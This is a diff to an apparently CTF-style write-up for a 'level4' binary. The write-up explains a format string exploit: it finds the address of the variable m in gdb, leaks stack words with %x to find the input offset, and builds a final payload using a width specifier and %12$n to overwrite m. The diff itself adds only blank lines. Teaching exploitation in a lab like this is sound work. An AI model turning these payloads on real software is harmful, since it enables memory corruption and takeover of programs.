@@ -24,12 +24,14 @@ We need this payload :
 ``gdb ./level4``
 
 **Searching for m adress :**
+
 ``(gdb) info variables``
 >All defined variables:
 [...]
 0x08049810  m
 
 **Searching for the stack adress of our input :**
+
 ``python -c "print 'AAAA' + ' %x ' * 12" | ./level4``
 >AAAA b7ff26b0  bffff784  b7fd0ff4  0  0  bffff748  804848d  bffff540  200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520
 
@@ -39,6 +41,7 @@ This time, we don't have enough space in buffer to store the number of char we n
 The width specifier is denoted by a number that specifies the minimum number of characters to be printed. If the printed value has fewer characters than the specified width, it will be padded with spaces on the left by default.
 
 This is our final payload:
+
 ``python -c "print '\x10\x98\x04\x08' + '%16930112u' + '%12\$n'" > /tmp/payload``
 
 ----
